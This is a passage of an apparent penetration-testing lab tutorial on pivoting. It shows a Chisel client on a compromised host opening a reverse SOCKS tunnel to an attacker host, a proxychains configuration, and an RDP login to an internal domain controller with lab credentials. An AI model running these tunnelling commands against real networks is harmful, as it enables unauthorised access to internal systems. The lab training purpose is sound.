+    2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
+    2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
+    
+
+Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`
+
+#### Connecting the Chisel Client to our Attack Host
+
+    ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+    
+    2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
+    2022/05/30 14:19:29 client: Handshaking...
+    2022/05/30 14:19:30 client: Sending config
+    2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
+    2022/05/30 14:19:30 client: tun: SSH connected
+    
+
+We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.
+
+#### Editing & Confirming proxychains.conf
+
+    matmarqx@htb[/htb]$ tail -f /etc/proxychains.conf 
+    
+    [ProxyList]
+    # add proxy here ...
+    # socks4    127.0.0.1 9050
+    socks5 127.0.0.1 1080 
+    
+
+If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+    matmarqx@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
